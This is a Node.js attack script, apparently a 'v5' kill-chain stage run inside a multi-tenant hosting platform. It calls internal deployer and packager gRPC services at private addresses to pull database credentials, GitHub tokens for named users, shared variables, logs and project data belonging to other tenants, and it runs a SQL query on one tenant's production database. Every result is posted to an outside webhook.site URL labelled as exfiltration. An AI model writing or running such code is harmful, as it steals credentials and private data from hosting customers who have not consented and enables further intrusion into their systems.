const https = require('https');
const http2 = require('http2');
const { execSync } = require('child_process');

const WEBHOOK = "https://webhook.site/a53d0af2-6332-4e99-a627-63f400ff70ee";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

// Build a protobuf message from field definitions
// Each field: { num, type, value } where type = 'string'|'int32'|'int64'|'bool'
function encodeProto(fields) {
  const bufs = [];
  for (const f of fields) {
    if (f.type === 'string' && f.value) {
      const strBuf = Buffer.from(f.value, 'utf8');
      // tag = (field_num << 3) | 2 (length-delimited)
      bufs.push(encodeVarint((f.num << 3) | 2));
      bufs.push(encodeVarint(strBuf.length));
      bufs.push(strBuf);
    }
  }
  return Buffer.concat(bufs);
}

function encodeVarint(value) {
  const bytes = [];
  while (value > 0x7f) {
    bytes.push((value & 0x7f) | 0x80);
    value >>>= 7;
  }
  bytes.push(value & 0x7f);
  return Buffer.from(bytes);
}

function grpcCall(host, port, service, method, protoFields) {
  return new Promise((resolve) => {
    try {
      const client = http2.connect('http://' + host + ':' + port);
      client.on('error', (e) => { resolve({ error: 'H2: ' + e.message }); });
      client.setTimeout(8000, () => { client.close(); resolve({ error: 'TIMEOUT' }); });
      
      const path = '/' + service + '/' + method;
      const req = client.request({
        ':method': 'POST',
        ':path': path,
        'content-type': 'application/grpc',
        'te': 'trailers',
      });
      
      let data = Buffer.alloc(0);
      let respHeaders = {};
      req.on('response', (h) => { respHeaders = h; });
      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
      req.on('end', () => {
        client.close();
        resolve({
          status: respHeaders[':status'],
          grpcStatus: respHeaders['grpc-status'],
          grpcMessage: respHeaders['grpc-message'],
          dataLen: data.length,
          dataHex: data.toString('hex').substring(0, 500),
          dataUtf8: data.toString('utf8').substring(0, 2000)
        });
      });
      req.on('error', (e) => { client.close(); resolve({ error: 'REQ: ' + e.message }); });
      
      // Encode protobuf payload
      const payload = protoFields ? encodeProto(protoFields) : Buffer.alloc(0);
      // gRPC frame: 1 byte compressed flag + 4 bytes length + payload
      const frame = Buffer.alloc(5 + payload.length);
      frame[0] = 0x00;
      frame.writeUInt32BE(payload.length, 1);
      payload.copy(frame, 5);
      req.end(frame);
    } catch(e) { resolve({ error: 'CATCH: ' + e.message }); }
  });
}

async function main() {
  await post('v5-start', new Date().toISOString());

  const DEPLOYER = { host: '10.98.64.141', port: 9003 };
  const PACKAGER = { host: '10.104.180.117', port: 9002 };

  // Known tenants from registry
  const tenants = [
    { ws: 'cblaettl', project: 'epic-falcon', env: 'production', db: 'laravel', svc: 'laravel' },
    { ws: 'cblaettl', project: 'mighty-heron', env: 'production', db: null, svc: 'loopcycles' },
    { ws: 'zeitlos-software', project: 'beast', env: 'production', db: null, svc: 'beast-website' },
    { ws: 'zeitlos-software', project: 'loopcycles', env: 'production', db: null, svc: 'loopcycles' },
    { ws: 'sandrooco', project: 'solar-manta', env: 'production', db: null, svc: 'unload' },
  ];

  // 1. DATABASE CREDENTIALS for all tenants with DBs
  for (const t of tenants) {
    if (!t.db) continue;
    const projectId = t.ws + '-' + t.project;
    const envNs = projectId + '-' + t.env;
    
    const res = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'DatabaseCredentials', [
      { num: 1, type: 'string', value: projectId },
      { num: 2, type: 'string', value: t.env },
      { num: 3, type: 'string', value: t.db },
    ]);
    await post('db-creds-' + t.ws + '-' + t.project, JSON.stringify(res, null, 2));
  }

  // 2. LIST ALL RESOURCE ALLOCATIONS (shows all workspaces/projects)
  const allocs = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'ListResourceAllocations', []);
  await post('all-resource-allocations', JSON.stringify(allocs, null, 2));

  // 3. GITHUB TOKENS for known user IDs
  // From JWTs: toni = "tzlz5foxh0aq", marcel = "ncswkf736cpf"
  // Try common patterns and the ones we know
  const userIds = ['tzlz5foxh0aq', 'ncswkf736cpf', 'admin', 'cblaettl', 'sandrooco'];
  for (const uid of userIds) {
    const res = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'UserGitHubToken', [
      { num: 1, type: 'string', value: uid },
    ]);
    await post('github-token-' + uid, JSON.stringify(res, null, 2));
  }

  // 4. DATABASE QUERY on cblaettl's DB
  const sqlRes = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'DatabaseQuery', [
    { num: 1, type: 'string', value: 'cblaettl-epic-falcon' },
    { num: 2, type: 'string', value: 'production' },
    { num: 3, type: 'string', value: 'laravel' },
    { num: 4, type: 'string', value: 'SELECT current_user, current_database(), inet_server_addr()' },
  ]);
  await post('sql-cblaettl', JSON.stringify(sqlRes, null, 2));

  // 5. SERVICE LOGS from zeitlos
  const logs = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'ServiceLogs', [
    { num: 1, type: 'string', value: 'zeitlos-software-beast' },
    { num: 2, type: 'string', value: 'production' },
    { num: 3, type: 'string', value: 'beast-website' },
  ]);
  await post('logs-zeitlos-beast', JSON.stringify(logs, null, 2));

  // 6. DEPLOY STATUS for all tenants
  for (const t of tenants) {
    const projectId = t.ws + '-' + t.project;
    const res = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'GetDeploymentStatus', [
      { num: 1, type: 'string', value: projectId },
      { num: 2, type: 'string', value: t.env },
    ]);
    await post('deploy-status-' + t.ws + '-' + t.project, JSON.stringify(res, null, 2));
  }

  // 7. PACKAGER: List ALL projects
  const projects = await grpcCall(PACKAGER.host, PACKAGER.port, 'packager.PackagerService', 'ListProjects', []);
  await post('all-projects', JSON.stringify(projects, null, 2));

  // 8. PACKAGER: Get project details for each tenant
  for (const t of tenants) {
    const projectId = t.ws + '-' + t.project;
    const res = await grpcCall(PACKAGER.host, PACKAGER.port, 'packager.PackagerService', 'GetProject', [
      { num: 1, type: 'string', value: projectId },
    ]);
    await post('project-detail-' + t.ws + '-' + t.project, JSON.stringify(res, null, 2));
  }

  // 9. PACKAGER: Read shared variables from other tenants
  for (const t of tenants) {
    const projectId = t.ws + '-' + t.project;
    const res = await grpcCall(PACKAGER.host, PACKAGER.port, 'packager.PackagerService', 'SharedVariables', [
      { num: 1, type: 'string', value: projectId },
      { num: 2, type: 'string', value: t.env },
    ]);
    await post('vars-' + t.ws + '-' + t.project, JSON.stringify(res, null, 2));
  }

  // 10. DEPLOYER: Suspend zeitlos workspace (DON'T actually do this - just test if it would work)
  // Instead, check if we can get workspace info
  const wsInfo = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'ResourceQuota', [
    { num: 1, type: 'string', value: 'zeitlos-software-beast' },
    { num: 2, type: 'string', value: 'production' },
  ]);
  await post('zeitlos-quota', JSON.stringify(wsInfo, null, 2));

  await post('v5-done', 'KILL CHAIN COMPLETE at ' + new Date().toISOString());
  console.log('v5 done');
}

main().catch(e => { console.error(e); post('v5-fatal', e.message); });
